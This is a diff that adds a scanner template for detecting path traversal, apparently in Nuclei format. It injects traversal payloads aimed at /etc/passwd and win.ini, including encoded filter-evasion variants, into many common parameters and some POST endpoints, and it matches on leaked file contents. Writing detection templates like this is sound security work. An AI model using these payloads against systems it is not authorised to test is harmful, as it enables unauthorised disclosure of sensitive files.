@@ -1,0 +1,93 @@
+id: path-traversal
+info:
+  name: Path Traversal / Directory Traversal
+  severity: High
+  description: |
+    检测路径遍历漏洞，通过注入../等路径遍历序列尝试读取系统敏感文件。
+    覆盖多种编码方式和注入点。
+  tags:
+    - path-traversal
+    - lfi
+    - injection
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file={{payload}}"
+      - "{{BaseURL}}/?path={{payload}}"
+      - "{{BaseURL}}/?page={{payload}}"
+      - "{{BaseURL}}/?include={{payload}}"
+      - "{{BaseURL}}/?template={{payload}}"
+      - "{{BaseURL}}/?doc={{payload}}"
+      - "{{BaseURL}}/?document={{payload}}"
+      - "{{BaseURL}}/?folder={{payload}}"
+      - "{{BaseURL}}/?name={{payload}}"
+      - "{{BaseURL}}/?src={{payload}}"
+      - "{{BaseURL}}/?dir={{payload}}"
+      - "{{BaseURL}}/?action={{payload}}"
+      - "{{BaseURL}}/?load={{payload}}"
+      - "{{BaseURL}}/?content={{payload}}"
+      - "{{BaseURL}}/?view={{payload}}"
+      - "{{BaseURL}}/?img={{payload}}"
+      - "{{BaseURL}}/?lang={{payload}}"
+      - "{{BaseURL}}/?style={{payload}}"
+    payload_sets:
+      default:
+        - "../../../../../../../../etc/passwd"
+        - "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+        - "/etc/passwd"
+        - "....//....//....//....//etc/passwd"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+        - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      windows:
+        - "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+        - "C:\\windows\\win.ini"
+        - "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+          - "root:$6$"
+          - "nobody:x:"
+          - "daemon:x:"
+          - "bin:x:"
+          - "[extensions]"
+          - "[fonts]"
+          - "[boot]"
+          - "MAV=0"
+          - "for 16-bit app support"
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/download"
+      - "{{BaseURL}}/api/file"
+      - "{{BaseURL}}/api/download"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "file={{payload}}&submit=Download"
+    payload_sets:
+      default:
+        - "../../../../../../../../etc/passwd"
+        - "/etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+          - "[extensions]"
+          - "[fonts]"
+        condition: or
+        part: body
